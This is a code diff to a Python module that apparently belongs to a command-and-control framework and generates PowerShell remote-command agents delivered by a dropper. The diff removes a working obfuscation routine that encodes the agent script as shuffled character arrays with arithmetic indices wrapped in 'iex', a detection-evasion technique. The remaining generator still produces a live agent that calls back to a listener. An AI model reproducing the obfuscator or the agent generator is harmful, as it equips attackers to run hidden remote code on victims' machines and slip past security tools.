@@ -1,23 +1,16 @@
 """
-Agent Generator with Advanced Obfuscation and WebClient SSL Support
+Agent Generator with WebClient SSL Support
 Module for generating PowerShell agents with WebClient for SSL compatibility
 Agent inherits SSL configuration from dropper
 """
 
 import socket
-import string
-import random
 
 class AgentGenerator:
     def __init__(self, config_loader, logger):
         self.config_loader = config_loader
         self.logger = logger
         self.agent_template = self._get_embedded_template()
-        self.amount_of_arrays = 3
-        self.array_name_length = 3
-        self.number_of_operations = 3
-        self.created_arrays = {}
-        self.list_of_chars = [char for char in string.printable]
     
     def _get_embedded_template(self):
         template = r'''$global:debugMode = {{DEBUG_MODE}}
@@ -1216,57 +1209,6 @@ execCommandLoop'''
         
         return template
     
-    def _generate_arrays(self):
-        self.created_arrays = {}
-        for _ in range(self.amount_of_arrays):
-            lof_copy = self.list_of_chars.copy()
-            array_name = "".join([random.choice(string.ascii_letters) for i in range(self.array_name_length)])
-            random.shuffle(lof_copy)
-            self.created_arrays[array_name] = lof_copy
-    
-    def _created_arrays_to_ps_string(self):
-        created_arrays_strings = ""
-        for name, chars_list in self.created_arrays.items():
-            created_arrays_strings += f"${name} = ("
-            for i, char in enumerate(chars_list):
-                created_arrays_strings += f"[char]({self._number_to_arithmetic_expression(ord(char))})"
-                if i != len(chars_list) - 1:
-                    created_arrays_strings += ","
-            created_arrays_strings += ")\n"
-        return created_arrays_strings
-    
-    def _number_to_arithmetic_expression(self, number):
-        parts = []
-        
-        for _ in range(self.number_of_operations):
-            num = random.randint(10, 99)
-            if random.choice([True, False]):
-                parts.append(f'+ {num}')
-                number -= num
-            else:
-                parts.append(f'- {num}')
-                number += num
-        
-        if number > 0:
-            parts.append(f'+ {number}')
-        elif number < 0:
-            parts.append(f'- {-number}')
-        
-        expression = ' '.join(parts).lstrip('+ ')
-        return expression if expression else '0'
-    
-    def _obfuscate_script_content(self, script_content):
-        self._generate_arrays()
-        arrays_declaration = self._created_arrays_to_ps_string()
-        obfuscated_command_string = "iex (("
-        for char in script_content:
-            array_name = random.choice(list(self.created_arrays.keys()))
-            char_index = self.created_arrays[array_name].index(char)
-            obfuscated_command_string += f"${array_name}[{self._number_to_arithmetic_expression(char_index)}],"
-        obfuscated_command_string = obfuscated_command_string.rstrip(',')
-        obfuscated_command_string += ') -JOIN "")'
-        return arrays_declaration + obfuscated_command_string
-    
     def _get_server_ip(self):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
@@ -1281,7 +1223,7 @@ execCommandLoop'''
                 return "127.0.0.1"
     
     def generate_agent(self, listener_config, custom_ip=None):
-        """Generate an obfuscated PowerShell agent for the given listener.
+        """Generate a PowerShell agent for the given listener.
 
         listener_config must have:
           - bind_port (int)
@@ -1332,10 +1274,8 @@ execCommandLoop'''
                 '{{AGENT_HEADERS}}', ps_headers
             )
 
-            obfuscated_agent = self._obfuscate_script_content(configured_agent)
-
-            self.logger.log_event(f"AGENT GENERATOR - WebClient obfuscated agent generated! ({self.amount_of_arrays} arrays, {len(self.created_arrays)} mappings)")
-            return obfuscated_agent
+            self.logger.log_event("AGENT GENERATOR - WebClient agent generated!")
+            return configured_agent
 
         except Exception as e:
             error_msg = f"Error generating obfuscated agent: {e}"
